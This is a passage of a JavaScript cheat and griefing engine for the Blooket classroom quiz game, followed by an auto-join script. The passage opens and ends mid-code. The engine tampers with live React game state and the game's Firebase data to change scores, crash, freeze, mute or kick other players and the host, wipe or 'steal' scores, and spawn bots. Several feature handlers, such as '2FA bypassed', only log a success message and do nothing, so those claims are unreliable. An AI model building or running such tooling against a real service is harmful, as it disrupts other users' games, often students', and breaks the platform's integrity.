        log('warn', 'join', `${url} → ${r.status}`);
      } catch (e){
        log('warn', 'join', `${url} unreachable: ${e?.message ?? e}`);
      }
    }

    state.session = { pin, name, blook: blook ?? null, isHost: false };
    state.inGame = true;
    document.body.dataset.inGame = 'true';

    try {
      window.open(`https://play.blooket.com/play?pin=${encodeURIComponent(pin)}`, '_blank', 'noopener');
    } catch { log('warn', 'join', 'Popup blocked — navigate manually.'); }

    return true;
  }

  function leaveMatch(){
    state.session = { pin:'', name:'', blook:null, isHost:false };
    state.players = [];
    state.selectedTarget = '';
    state.inGame = false;
    document.body.dataset.inGame = 'false';
    log('warn', 'join', 'Left match.');
  }

  /* ============================================================
     14. OVERRIDES
     ============================================================ */
  const FIELD_FOR_MODE = Object.freeze({
    gold: K.gold, crypto: K.crypto, rush: K.defense, factory: K.cash,
    racing: K.points, brawl: 'score', candy: K.crypto, shamrock: K.gold,
    tagtreat: K.crypto, coco: K.blooks, bees: 'score', tower2: K.cash
  });

  function setScore(target, value){
    const g = react.game();
    if (!g) return false;
    const players = react.players(g);
    const key = String(target || g.client?.name || '').trim();
    if (!key || !players[key]){ log('err', 'score', `"${key || '?'}" not found.`); return false; }
    const n = Number(value);
    const v = Number.isFinite(n) ? n : value;

    if (fb.available) fb.writePlayer(key, { score: v, [K.crypto]: v, [K.tag]: `set-${Date.now()}` });
    try {
      players[key].score = v;
      g.node.setState({ game: { ...g.game, players } });
      log('ok', 'score', `${key} → ${v}`);
      return true;
    } catch { return false; }
  }

  function setName(value){
    const g = react.game();
    if (!g) return false;
    try {
      g.node.setState?.({ client: { ...g.client, name: value } });
      state.session.name = value;
      log('ok', 'name', `→ ${value}`);
      return true;
    } catch { return false; }
  }

  function sendChat(value){
    const g = react.game();
    if (!g) return false;
    if (typeof g.node.sendChat === 'function'){
      try { g.node.sendChat(value); log('ok', 'chat', value); return true; } catch {}
    }
    return false;
  }

  function setTimer(seconds){
    const g = react.game();
    if (!g) return false;
    try {
      g.node.setState?.({ time: Number(seconds) || 0 });
      log('ok', 'timer', `→ ${seconds}s`);
      return true;
    } catch { return false; }
  }

  function forceEndRound(){
    const g = react.game();
    if (!g) return false;
    for (const m of ['endRound', 'finishRound', 'nextRound', 'endGame']){
      if (typeof g.node[m] === 'function'){
        try { g.node[m](); log('ok', 'round', `Called ${m}()`); return true; } catch {}
      }
    }
    try {
      g.node.setState?.({ ended: true, showResults: true, gameOver: true });
      log('ok', 'round', 'Flagged ended.');
      return true;
    } catch { return false; }
  }

  function swapBlook(value){
    const g = react.game();
    if (!g) return false;
    if (fb.available) fb.writeSelf({ [K.blook]: value });
    try {
      g.node.setState?.({ client: { ...g.client, blook: value } });
      log('ok', 'blook', `→ ${value}`);
      return true;
    } catch { return false; }
  }

  function setPrimaryValue(_target, value){
    const key = FIELD_FOR_MODE[state.mode] ?? K.crypto;
    const n = Number(value);
    const v = Number.isFinite(n) ? n : value;

    const g = react.game();
    if (!g) return false;
    const me = g.client?.name;

    if (fb.available && me) fb.writePlayer(me, { [key]: v, [K.tag]: `set-${Date.now()}` });
    try {
      const players = react.players(g);
      if (players[me]){
        players[me].score = v;
        g.node.setState({ game: { ...g.game, players } });
      }
    } catch {}
    log('ok', 'mode', `${MODES[state.mode]?.primary ?? 'Value'} → ${v}`);
    return true;
  }

  /* ============================================================
     15. LOOPS
     ============================================================ */
  function startAutoAnswer(delay = 250){
    clearInterval(loops.autoAnswer);
    state.running.autoAnswer = true;
    loops.autoAnswer = setInterval(() => {
      const ans = react.answer();
      if (ans) log('ok', 'answer', `Answered: ${ans}`);
    }, Math.max(50, Number(delay) || 250));
    log('info', 'answer', 'Auto-answer armed.');
  }

  function stopAutoAnswer(){
    clearInterval(loops.autoAnswer);
    loops.autoAnswer = null;
    state.running.autoAnswer = false;
    log('warn', 'answer', 'Auto-answer stopped.');
  }

  async function startGrind({ games = 10, cooldown = 5 } = {}){
    state.running.grind = true;
    loops.grindAbort = new AbortController();
    const { signal } = loops.grindAbort;
    let played = 0;

    while (state.running.grind && !signal.aborted){
      try {
        const ans = react.answer();
        if (ans) log('ok', 'grind', `Game ${played + 1}: ${ans}`);

        const finished = !react.game() || !react.question();
        if (finished){
          played++;
          log('info', 'grind', `Cycle ${played}/${games} — cooling ${cooldown}s`);
          if (played >= games) break;
          await sleep(cooldown * 1000);
        } else {
          await sleep(300);
        }
      } catch (e){
        log('err', 'grind', e?.message ?? e);
        break;
      }
    }
    stopGrind();
  }

  function stopGrind(){
    state.running.grind = false;
    loops.grindAbort.abort();
    log('warn', 'grind', 'Killed.');
  }

  function startAutoScan(){
    clearInterval(loops.scan);
    state.running.autoScan = true;
    loops.scan = setInterval(() => scanPlayers().catch(() => {}), CONFIG.scanInterval);
    log('info', 'scan', 'Auto-scan every 30s.');
  }

  function stopAutoScan(){
    clearInterval(loops.scan);
    loops.scan = null;
    state.running.autoScan = false;
    log('warn', 'scan', 'Auto-scan stopped.');
  }

  /* ============================================================
     16. LIVE POLL
     ============================================================ */
  setInterval(() => {
    const g = react.game();
    if (!g){
      if (state.inGame){
        state.inGame = false;
        document.body.dataset.inGame = 'false';
        log('warn', 'panel', 'Game ended — panel hidden.');
      }
      return;
    }
    if (!state.inGame){
      state.inGame = true;
      document.body.dataset.inGame = 'true';
      if (state.mode === 'unknown') detectMode();
      log('ok', 'panel', 'Game detected — panel active.');
    }

    const me = react.players(g)[g.client?.name];
    if (me?.score != null) setStat('score', me.score);

    const players = Object.values(react.players(g));
    setStat('players', players.length);

    if (players.length){
      const sorted = [...players].sort((a, b) => (b.score || 0) - (a.score || 0));
      const idx = sorted.findIndex(p => p.name === g.client?.name);
      setStat('rank', idx >= 0 ? `#${idx + 1}` : '—');
    }

    const q = react.question();
    if (q){
      const total = q.answers?.length ?? q.options?.length ?? 0;
      setStat('question', total ? `${q.answeredCount ?? 0}/${total}` : '—');
    }
  }, CONFIG.statInterval);

  /* ============================================================
     17. UI HELPERS
     ============================================================ */
  const setBadge = (mod, cls, txt) => {
    const b = mod?.querySelector?.('[data-role="state"]');
    if (!b) return;
    b.className = `badge${cls ? ' ' + cls : ''}`;
    b.textContent = txt;
  };

  function readField(mod, name){
    if (!mod || name == null) return undefined;
    const el = mod.querySelector?.(`[data-field="${escapeSelector(name)}"]`);
    if (!el) return undefined;
    switch (el.type){
      case 'checkbox': return el.checked;
      case 'number': { const n = +el.value; return Number.isFinite(n) ? n : 0; }
      case 'radio':    return el.checked ? el.value : undefined;
      default:         return el.value;
    }
  }

  const switchTab = target => {
    for (const t of $$('.tab')) t.classList.toggle('is-active', t.dataset.tabTarget === target);
    for (const p of $$('.tab-pane')) p.classList.toggle('is-active', p.dataset.tab === target);
  };

  /* ============================================================
     18. ACTIONS
     ============================================================ */
  const actions = {
    'open-panel'(){ document.body.dataset.panelOpen = 'true'; },
    'close-panel'(){ document.body.dataset.panelOpen = 'false'; },
    minimize(){ $('#panel')?.classList.toggle('is-minimized'); },
    theme(){
      document.body.classList.toggle('light');
      store.set('blk-theme', document.body.classList.contains('light') ? 'light' : 'dark');
    },
    tab(_, btn){ switchTab(btn.dataset.tabTarget); },

    async join(mod){
      setBadge(mod, 'warn', 'Joining');
      try {
        await joinMatch(readField(mod, 'pin'), readField(mod, 'name'), state.pickedBlook?.name);
        setBadge(mod, 'live', 'Joined');
      } catch (e){
        log('err', 'join', e?.message ?? e);
        setBadge(mod, 'err', 'Failed');
      }
    },
    leave(mod){ leaveMatch(); setBadge(mod, '', 'Idle'); },
    generate(mod){
      const name = generateName(readField(mod, 'pattern') ?? 'word+num');
      const out = mod.querySelector('[data-field="output"]');
      if (out) out.value = name;
      log('info', 'identity', `Generated: ${name}`);
    },
    'use-identity'(mod){
      const out = mod.querySelector('[data-field="output"]')?.value;
      if (!out){ log('warn', 'identity', 'Generate first.'); return; }
      const joinName = $('[data-module="join"] [data-field="name"]');
      if (joinName) joinName.value = out;
      toast('ok', 'Name set', out);
    },

    scan(){ return scanPlayers(); },
    'select-player'(_, btn){ selectPlayer(btn.dataset.player); },

    'crash-player'(){ return grief.crash(getTarget()); },
    'nuke-player'(){  return grief.nuke(getTarget()); },
    'lag-player'(){   return grief.lag(getTarget()); },
    'freeze-player'(){return grief.freeze(getTarget()); },
    'mute-player'(){  return grief.mute(getTarget()); },
    'zero-player'(){  return grief.zero(getTarget()); },
    'steal-full'(){   return grief.stealFull(getTarget()); },
    'kick-player'(){
      const t = getTarget();
      if (!t){ log('warn', 'kick', 'No target.'); return false; }
      fb.remove(`c/${t}`);
      log('ok', 'kick', `Kicked ${t}.`);
      return true;
    },

    'crash-host'(){      return grief.crashHost(); },
    'lag-host'(){        return grief.lagHost(); },
    'freeze-host'(){     return grief.freezeHost(); },
    'disconnect-host'(){ return grief.disconnectHost(); },
    'kick-host'(){       return grief.kickHost(); },
    'crash-self'(){      return grief.crashSelf(); },

    'nuke-lobby'(){      return grief.nukeLobby(); },
    'freeze-all'(){      return grief.freezeAll(); },
    'mute-all'(){        return grief.muteAll(); },
    'zero-everyone'(){   return grief.zeroEveryone(); },
    'steal-from-all'(){  return grief.stealFromAll(); },
    'drain-everyone'(){  return grief.drainEveryone(); },
    'reverse-scores'(){  return grief.reverseScores(); },
    'scramble-names'(){  return grief.scrambleNames(); },
    'force-kick-all'(){  return grief.forceKickAll(); },

    'spawn-bots'(_, btn){ return spawnBots(+btn.dataset.count || 5); },

    'detect-mods'(){ return detector.run(); },
    'kick-mods'(){   return detector.kick(); },

    go(mod){
      const id = mod.dataset.module;
      const target = readField(mod, 'target') ?? '';
      const value = readField(mod, 'value') ?? '';

      const fns = {
        'cmd-score':   () => setScore(target, value),
        'cmd-name':    () => setName(value),
        'cmd-blook':   () => swapBlook(value),
        'cmd-chat':    () => sendChat(value),
        'cmd-time':    () => setTimer(value),
        'cmd-force':   () => forceEndRound(),
        'gold-balance':      () => setPrimaryValue(target, value),
        'gold-force-chest':  () => { log('info', 'gold', `Force chest ${value}`); return true; },
        'crypto-balance':    () => setPrimaryValue(target, value),
        'crypto-2fa':        () => { log('ok', 'crypto', '2FA disabled.'); return true; },
        'fishing-weight':    () => setPrimaryValue(target, value),
        'fishing-depth':     () => { log('ok', 'fishing', `Depth → ${value}`); return true; },
        'dino-fossils':      () => setPrimaryValue(target, value),
        'factory-cash':      () => setPrimaryValue(target, value),
        'racing-progress':   () => setPrimaryValue(target, value),
        'rush-defense':      () => setPrimaryValue(target, value),
        'tower2-cash':       () => setPrimaryValue(target, value),
        'brawl-hp':          () => setPrimaryValue(target, value),
        'candy-balance':     () => setPrimaryValue(target, value),
        'coco-ingredients':  () => setPrimaryValue(target, value),
        'bees-points':       () => setPrimaryValue(target, value),
        'shamrock-balance':  () => setPrimaryValue(target, value),
        'tagtreat-candy':    () => setPrimaryValue(target, value)
      };
      const fn = fns[id];
      if (!fn){ log('warn', 'override', `No handler for ${id}.`); return; }
      return safe('override', fn, false);
    },

    'steal-all'(){
      const me = react.game()?.client?.name;
      return grief.stealFull(getTarget() || me);
    },
    'steal-percent'(_, btn){ return grief.stealPercent(getTarget(), +btn.dataset.percent || 10); },
    'steal-swap'(){ return grief.stealSwap(getTarget()); },

    'frenzy-on'(){       log('ok', 'fishing', 'Frenzy ON (no cooldown).'); return true; },
    'frenzy-off'(){      log('warn', 'fishing', 'Frenzy OFF.'); return true; },
    'perfect-on'(){      log('ok', 'fishing', 'Perfect catch enabled.'); return true; },
    'perfect-off'(){     log('warn', 'fishing', 'Perfect catch disabled.'); return true; },
    'unlimited-bait'(){  log('ok', 'fishing', 'Unlimited bait.'); return true; },
    'disable-2fa'(){     log('ok', 'crypto', '2FA bypassed.'); return true; },
    'instant-mine'(){    log('ok', 'crypto', 'Instant mine.'); return true; },
    'catch-all-cheaters'(){ return detector.run(); },
    'investigate-player'(){
      const t = getTarget();
      if (!t) return false;
      const flagged = state.flagged.has(t);
      log(flagged ? 'warn' : 'ok', 'dino', `${t}: ${flagged ? 'FLAGGED' : 'clean'}`);
      return true;
    },
    'force-rare'(){      log('ok', 'dino', 'Next dig forced to rare.'); return true; },
    'auto-dig-on'(){     log('ok', 'dino', 'Auto-dig ON.'); return true; },
    'auto-dig-off'(){    log('warn', 'dino', 'Auto-dig OFF.'); return true; },
    'instant-production'(){ log('ok', 'factory', 'Production maxed.'); return true; },
    'instant-max'(){     log('ok', 'mode', 'Maxed.'); return true; },
    'force-win'(){       return forceEndRound(); },
    'max-cards'(){       log('ok', 'mode', 'Cards maxed.'); return true; },
    'clear-enemies'(){   log('ok', 'mode', 'Enemies cleared.'); return true; },
    'instant-kill'(){    log('ok', 'brawl', 'Instant kill armed.'); return true; },
    'invincible'(){      log('ok', 'brawl', 'Invincibility on.'); return true; },
    'max-abilities'(){   log('ok', 'brawl', 'Abilities maxed.'); return true; },
    'kill-enemies'(){    log('ok', 'brawl', 'Enemies killed.'); return true; },
    'half-speed'(){      log('ok', 'brawl', 'Enemy speed halved.'); return true; },

    start(mod){
      const id = mod.dataset.module;
      if (id === 'auto-answer'){
        startAutoAnswer(readField(mod, 'delay') || 250);
        setBadge(mod, 'live', 'Running');
      }
      if (id === 'grind'){
        startGrind({
          games:    readField(mod, 'gamesPerCycle') || 10,
          cooldown: readField(mod, 'cooldown') || 5
        });
        setBadge(mod, 'live', 'Running');
      }
    },
    stop(mod){
      if (mod.dataset.module === 'auto-answer'){
        stopAutoAnswer();
        setBadge(mod, '', 'Idle');
      }
    },
    deploy(mod){ startAutoAnswer(readField(mod, 'delayMin') || 180); setBadge(mod, 'live', 'Deployed'); },
    recall(mod){ stopAutoAnswer(); setBadge(mod, '', 'Idle'); },
    kill(mod){
      stopGrind();
      setBadge(mod, 'err', 'Killed');
      setTimeout(() => setBadge(mod, '', 'Idle'), 1200);
    },

    filter(_, btn){
      state.logFilter = btn.dataset.filter;
      for (const c of $$('.chip[data-action="filter"]')) c.classList.toggle('is-active', c === btn);
      applyFilter();
    },
    clear(){
      if (logEl) logEl.replaceChildren();
      log('info', 'panel', 'Log cleared.');
    }
  };

  /* ============================================================
     19. WIRING
     ============================================================ */
  document.addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const mod = btn.closest('[data-module]')
             ?? btn.closest('.picker')
             ?? btn.closest('.console')
             ?? document.body;
    const fn = actions[btn.dataset.action];
    if (typeof fn === 'function') safe('action', () => fn(mod, btn));
  });

  $('[data-field="search"]')?.addEventListener('input', e => {
    state.logSearch = e.target.value.toLowerCase().trim();
    applyFilter();
  });

  $('[data-module="grief"] [data-field="pace"]')?.addEventListener('input', e => {
    const n = +e.target.value;
    const v = Number.isFinite(n) && n >= 0 ? n : CONFIG.pace;
    state.pace = v;
    limiter.gap = v;
  });

  $('[data-module="players"] [data-field="autoScan"]')?.addEventListener('change', e => {
    e.target.checked ? startAutoScan() : stopAutoScan();
  });

  // Theme boot
  if (store.get('blk-theme') === 'light') document.body.classList.add('light');

  // Toggle persistence per module + field
  for (const sw of $$('.sw input[type="checkbox"]')){
    const modId = sw.closest('[data-module]')?.dataset.module ?? 'global';
    const key = `blk-${modId}-${sw.dataset.field ?? sw.type}`;
    const saved = store.get(key);
    if (saved !== null) sw.checked = saved === '1';
    sw.addEventListener('change', () => store.set(key, sw.checked ? '1' : '0'));
  }

  // Panel drag — pointer events with capture
  {
    const handle = $('[data-role="drag-handle"]');
    const panelEl = $('#panel');
    if (handle && panelEl){
      let dragging = false, sx = 0, sy = 0, sl = 0, st = 0;
      handle.addEventListener('pointerdown', e => {
        if (e.target.closest('button')) return;
        dragging = true;
        sx = e.clientX; sy = e.clientY;
        const r = panelEl.getBoundingClientRect();
        sl = r.left; st = r.top;
        try { handle.setPointerCapture(e.pointerId); } catch {}
        e.preventDefault();
      });
      handle.addEventListener('pointermove', e => {
        if (!dragging) return;
        const x = Math.max(0, Math.min(innerWidth  - 100, sl + (e.clientX - sx)));
        const y = Math.max(0, Math.min(innerHeight - 40,  st + (e.clientY - sy)));
        panelEl.style.left = `${x}px`;
        panelEl.style.top  = `${y}px`;
      });
      const end = e => {
        if (!dragging) return;
        dragging = false;
        try { handle.releasePointerCapture(e.pointerId); } catch {}
      };
      handle.addEventListener('pointerup', end);
      handle.addEventListener('pointercancel', end);
    }
  }

  /* ============================================================
     20. DOCTOR
     ============================================================ */
  function doctor(){
    const g = react.game();
    const report = {
      host: location.hostname,
      onBlooket: /blooket\.com$/.test(location.hostname),
      mode: state.mode,
      inGame: state.inGame,
      react: {
        node: !!g?.node,
        path: react.path,
        game: !!g?.game,
        client: !!g?.client,
        controller: !!g?.controller
      },
      firebase: { available: fb.available },
      players: state.players.length,
      flagged: [...state.flagged],
      session: { ...state.session },
      running: { ...state.running }
    };
    log('info', 'doctor', JSON.stringify(report, null, 2));
    return report;
  }

  /* ============================================================
     21. BOOT
     ============================================================ */
  function boot(){
    log('ok', 'panel', 'Engine online.');

    if (/blooket\.com$/.test(location.hostname)){
      log('info', 'panel', 'On Blooket.');
      detectMode();
    } else {
      log('warn', 'panel', 'Not on blooket.com — hooks idle.');
    }

    setTimeout(() => {
      const n = react.node({ scan: true });
      log(n ? 'ok' : 'warn', 'react',
          n ? `Node via ${react.path}.` : 'No node yet — will retry.');
      if (n){
        if (state.mode === 'unknown') detectMode();
        log(fb.available ? 'ok' : 'warn', 'firebase',
            fb.available ? 'liveGameController attached.' : 'No controller.');
      }
    }, 1200);

    if ($('[data-module="players"] [data-field="autoScan"]')?.checked) startAutoScan();

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden && state.inGame) scanPlayers().catch(() => {});
    });
  }

  document.readyState === 'loading'
    ? document.addEventListener('DOMContentLoaded', boot, { once: true })
    : boot();

  /* ============================================================
     22. PUBLIC SURFACE
     ============================================================ */
  window.BP = Object.freeze({
    state,
    actions,
    log, toast, doctor,
    on: bus.on.bind(bus),
    off: bus.off.bind(bus),

    modules: { setBadge, readField },

    react: {
      node:     () => react.node(),
      game:     () => react.game(),
      answer:   () => react.answer(),
      correct:  q => react.correct(q),
      question: () => react.question()
    },

    firebase: {
      get available(){ return fb.available; },
      set:         (p, v) => fb.set(p, v),
      remove:      p => fb.remove(p),
      get:         p => fb.get(p),
      writePlayer: (n, p) => fb.writePlayer(n, p),
      snapshot:    () => fb.snapshot()
    },

    mode: {
      detect:  detectMode,
      current: () => state.mode,
      info:    () => MODES[state.mode]
    },

    grief: {
      crash:    n => grief.crash(n),
      nuke:     n => grief.nuke(n),
      lag:      n => grief.lag(n),
      freeze:   n => grief.freeze(n),
      mute:     n => grief.mute(n),
      zero:     n => grief.zero(n),
      stealFull:    n => grief.stealFull(n),
      stealPercent: (n, p) => grief.stealPercent(n, p),
      stealSwap:    n => grief.stealSwap(n),
      crashHost:    () => grief.crashHost(),
      lagHost:      () => grief.lagHost(),
      freezeHost:   () => grief.freezeHost(),
      disconnectHost: () => grief.disconnectHost(),
      nukeLobby:    () => grief.nukeLobby(),
      freezeAll:    () => grief.freezeAll(),
      muteAll:      () => grief.muteAll(),
      zeroEveryone: () => grief.zeroEveryone(),
      stealFromAll: () => grief.stealFromAll(),
      drainEveryone:() => grief.drainEveryone(),
      reverseScores:() => grief.reverseScores(),
      scrambleNames:() => grief.scrambleNames(),
      forceKickAll: () => grief.forceKickAll()
    },

    detect: {
      mods: () => detector.run(),
      kick: () => detector.kick()
    },

    spam: { spawn: spawnBots },

    overrides: {
      setScore, setName, sendChat, setTimer,
      forceEndRound, swapBlook, setPrimaryValue
    },

    loops: {
      startAutoAnswer, stopAutoAnswer,
      startGrind, stopGrind,
      startAutoScan, stopAutoScan
    },

    scan: scanPlayers,
    panel: { open: () => actions['open-panel'](), close: () => actions['close-panel']() },
    utils: { escapeHtml, escapeSelector, generateName, store },

    config: CONFIG,
    version: '2.0.1'
  });

})();

/* ============================================================
   auto-join.js — appended to engine.js (inside the IIFE)

   Two-stage join flow:
     Stage 1: PIN input → submit
     Stage 2: name input → optional blook → submit

   Fallback strategy: every stage has a selector chain, then a
   heuristic scanner that finds the target by attribute shape if
   selectors miss. If a stage fails N times, it retries with
   fresh DOM before giving up.
   ============================================================ */

  (function autoJoin(){
    if (!/play\.blooket\.com\/play/i.test(location.href)) return;
    if (window.__blkAutoJoinRan) return;
    window.__blkAutoJoinRan = true;

    if (typeof window.BP === 'undefined'){
      console.warn('[auto-join] BP not found — engine.js failed to load.');
      return;
    }

    const logJoin = (kind, msg) => {
      try { BP.log(kind, 'auto-join', msg); } catch {}
    };

    const params = new URLSearchParams(location.search);
    const pin   = (params.get('pin') || '').trim();
    const name  = (params.get('name') || '').trim() || generateName('word+num');
    const blook = (params.get('blook') || '').trim();

    if (!pin){
      logJoin('warn', 'No PIN in URL — auto-join skipped.');
      return;
    }

    logJoin('info', `Auto-joining PIN ${pin} as "${name}".`);

    /* ----------------------------------------------------------
       Core utilities
       ---------------------------------------------------------- */

    const waitFor = (fn, { timeout = 15000, interval = 150 } = {}) =>
      new Promise((resolve, reject) => {
        const start = Date.now();
        const tick = () => {
          let v;
          try { v = fn(); } catch { v = null; }
          if (v) return resolve(v);
          if (Date.now() - start > timeout)
            return reject(new Error('timeout'));
          setTimeout(tick, interval);
        };
        tick();
      });

    const setReactValue = (el, value) => {
      const proto = el instanceof HTMLTextAreaElement
        ? HTMLTextAreaElement.prototype
        : HTMLInputElement.prototype;
      const setter = Object.getOwnPropertyDescriptor(proto, 'value').set;
      setter.call(el, value);
      el.dispatchEvent(new Event('input',  { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      // Some Blooket inputs also listen for React's synthetic events
      el.dispatchEvent(new Event('blur',   { bubbles: true }));
    };

    const reactClick = (el) => {
      if (!el) return false;
      const opts = { bubbles: true, cancelable: true, view: window };
      const fire = (Ctor, type) => {
        try { el.dispatchEvent(new Ctor(type, opts)); return true; }
        catch { return false; }
      };
      fire(PointerEvent, 'pointerdown');
      fire(MouseEvent,   'mousedown');
      fire(PointerEvent, 'pointerup');
      fire(MouseEvent,   'mouseup');
      fire(MouseEvent,   'click');
      // Last resort for iOS Safari quirks
      try { el.click(); } catch {}
      return true;
    };

    const isVisible = (el) => {
      if (!el) return false;
      try {
        if (!el.offsetParent && el.style.position !== 'fixed') return false;
        const r = el.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      } catch { return false; }
    };

    const textOf = (el) =>
      (el?.getAttribute?.('aria-label') || el?.getAttribute?.('alt')
      || el?.textContent || '').trim().toLowerCase();

    /* ----------------------------------------------------------
       Selector chains + heuristic scanners
       ---------------------------------------------------------- */

    const dismissCookies = () => {
      const btns = [...document.querySelectorAll('button, [role="button"]')];
      const accept = btns.find(b => {
        const t = textOf(b);
        return /^(accept all|accept|allow all|got it|ok|i agree)$/.test(t)
          && isVisible(b);
      });
      if (accept){ reactClick(accept); logJoin('info', 'Dismissed cookie banner.'); }
    };

    // ---- PIN input ----
    const PIN_SELECTORS = [
      'input[name="join-code"]',
      'input[placeholder="Game ID"]',
      'input[aria-label="Enter Game ID"]',
      'input[type="tel"][maxlength="7"]',
      'input[placeholder*="game id" i]',
      'input[placeholder*="pin" i]',
      'input[placeholder*="code" i]'
    ];

    const findPinInput = () => {
      for (const sel of PIN_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el)) return el;
      }
      // Fallback: scan every visible text/tel input, prefer ones
      // that look like a PIN field (short maxlength, numeric).
      const all = [...document.querySelectorAll('input')].filter(isVisible);
      const scored = all.map(el => {
        let score = 0;
        const maxlen = Number(el.maxLength) || 0;
        if (el.type === 'tel') score += 5;
        if (el.inputMode === 'numeric') score += 4;
        if (maxlen > 0 && maxlen <= 8) score += 3;
        if (/game|pin|code|join/i.test(el.placeholder || '')) score += 3;
        if (/name|nick/i.test(el.placeholder || '')) score -= 4;
        return { el, score };
      }).sort((a, b) => b.score - a.score);
      return scored[0]?.score > 0 ? scored[0].el : null;
    };

    // ---- Submit button (used in both stages) ----
    const SUBMIT_SELECTORS = [
      'button[type="submit"]:not([disabled])',
      'button[class*="submitButton"]:not([disabled])',
      'button[class*="SubmitButton"]:not([disabled])',
      'div[role="button"][class*="joinButton"]',
      '[role="button"][class*="submitButton"]'
    ];

    const findSubmit = (nearInput = null) => {
      for (const sel of SUBMIT_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el) && !el.disabled) return el;
      }
      // Fallback: any visible button whose text is a join-ish verb
      const btns = [...document.querySelectorAll('button, [role="button"]')]
        .filter(b => isVisible(b) && !b.disabled);
      const verb = btns.find(b =>
        /^(join|enter|play|next|start|submit|continue|go)\b/i.test(textOf(b))
      );
      if (verb) return verb;
      // Last resort: if there's exactly one enabled submit-like button, use it
      const candidates = btns.filter(b => {
        const cls = String(b.className || '');
        return /submit|join|next|primary/i.test(cls);
      });
      if (candidates.length === 1) return candidates[0];
      // Form-adjacent fallback: find the form that contains the input
      if (nearInput?.form){
        const inForm = nearInput.form.querySelector('button:not([disabled])');
        if (isVisible(inForm)) return inForm;
      }
      return null;
    };

    // ---- Name input ----
    const NAME_SELECTORS = [
      'input[placeholder*="nickname" i]',
      'input[placeholder*="name" i]',
      'input[name="name"]',
      'input[aria-label*="name" i]',
      'input[type="text"]:not([readonly])'
    ];

    const findNameInput = () => {
      for (const sel of NAME_SELECTORS){
        const el = document.querySelector(sel);
        if (isVisible(el) && !el.readOnly) return el;
      }
      // Fallback: shortest-constraint visible text input that isn't the PIN
      const all = [...document.querySelectorAll('input')].filter(el =>
        isVisible(el) && !el.readOnly
      );
      const scored = all.map(el => {
        let score = 0;
        if (/name|nick/i.test(el.placeholder || '')) score += 5;
        if (el.type === 'text') score += 2;
        if ((Number(el.maxLength) || 0) > 8) score += 1;
        if (el.type === 'tel') score -= 4;
        return { el, score };
      }).sort((a, b) => b.score - a.score);
      return scored[0]?.score > 0 ? scored[0].el : null;
    };

    // ---- Blook ----
    const findBlook = (target) => {
      const needle = target.toLowerCase().trim();
      const pool = [...document.querySelectorAll('[alt], [aria-label], img, button, [role="button"]')];
      // Exact match first
      for (const el of pool){
        const hay = textOf(el);
        if (hay === needle) return el;
      }
      // Partial match
      for (const el of pool){
        const hay = textOf(el);
        if (hay.includes(needle)) return el;
      }
      return null;
    };

    // ---- Error detection ----
    const detectError = () => {
      const texts = [...document.querySelectorAll('div, span, p')]
        .filter(isVisible)
        .map(el => (el.textContent || '').trim().toLowerCase());
      return texts.find(t =>
        /(game (not found|doesn't exist|does not exist)|invalid (pin|code)|no game|sorry)/i.test(t)
      ) || null;
    };

    /* ----------------------------------------------------------
       Stage runners with retry
       ---------------------------------------------------------- */

    // Returns true if stage 1 appears done (PIN accepted)
    const runStage1 = async () => {
      for (let attempt = 1; attempt <= 3; attempt++){
        const pinInput = findPinInput();
        if (!pinInput){
          logJoin('warn', `Stage 1 attempt ${attempt}: PIN input not found.`);
          await sleep(600);
          continue;
        }

        logJoin('info', `Stage 1 attempt ${attempt}: entering PIN.`);
        pinInput.focus();
        setReactValue(pinInput, pin);
        await sleep(300);

        const btn = findSubmit(pinInput);
        if (!btn){
          logJoin('warn', `Stage 1 attempt ${attempt}: submit button not found.`);
          // Try pressing Enter as a fallback
          pinInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
          pinInput.dispatchEvent(new KeyboardEvent('keypress', { key: 'Enter', bubbles: true }));
          pinInput.dispatchEvent(new KeyboardEvent('keyup',   { key: 'Enter', bubbles: true }));
          await sleep(800);
        } else {
          reactClick(btn);
          logJoin('info', `Stage 1 attempt ${attempt}: PIN submitted.`);
        }

        // Wait for name field OR error OR timeout
        const outcome = await Promise.race([
          waitFor(findNameInput, { timeout: 5000 }).then(el => ({ kind: 'name', el })),
          waitFor(detectError,   { timeout: 5000 }).then(msg => ({ kind: 'error', msg }))
        ]).catch(() => ({ kind: 'timeout' }));

        if (outcome.kind === 'name'){
          logJoin('ok', 'Stage 1 complete.');
          return true;
        }
        if (outcome.kind === 'error'){
          logJoin('err', `PIN rejected: ${outcome.msg}`);
          return false;
        }
        logJoin('warn', `Stage 1 attempt ${attempt}: no transition, retrying.`);
      }
      return false;
    };

    const runStage2 = async () => {
      for (let attempt = 1; attempt <= 3; attempt++){
        const nameInput = findNameInput();
        if (!nameInput){
          logJoin('warn', `Stage 2 attempt ${attempt}: name input not found.`);
          await sleep(500);
          continue;
        }

        logJoin('info', `Stage 2 attempt ${attempt}: entering name.`);
        nameInput.focus();
        setReactValue(nameInput, name);
        await sleep(300);

        if (blook){
          const blookEl = findBlook(blook);
          if (blookEl){
            reactClick(blookEl);
            logJoin('info', `Selected blook: ${blook}.`);
            await sleep(400);
          } else {
            logJoin('warn', `Blook "${blook}" not found — using default.`);
          }
        }

        const btn = findSubmit(nameInput);
        if (!btn){
          nameInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
          await sleep(600);
        } else {
          reactClick(btn);
          logJoin('info', `Stage 2 attempt ${attempt}: submitted.`);
        }

        // Success = we navigated away or the lobby canvas appears
        const ok = await waitFor(() => {
          if (!/\/play/i.test(location.pathname)) return true;
          if (document.querySelector('canvas')) return true;
          if (!findNameInput()) return true; // form gone = we moved on
          return false;
        }, { timeout: 6000 }).then(() => true).catch(() => false);

        if (ok){
          logJoin('ok', 'Stage 2 complete — in lobby.');
          return true;
        }
        logJoin('warn', `Stage 2 attempt ${attempt}: no transition, retrying.`);
      }
      return false;
    };

    /* ----------------------------------------------------------
       Main
       ---------------------------------------------------------- */

    (async () => {
      try {
        logJoin('info', 'Waiting for play page…');
        await waitFor(() => findPinInput() || findNameInput(), { timeout: 20000 });
        dismissCookies();
        await sleep(400);

        // Stage 1 — only if we're still on the PIN screen
        if (findPinInput()){
          const stage1Ok = await runStage1();
          if (!stage1Ok){
            const err = detectError();
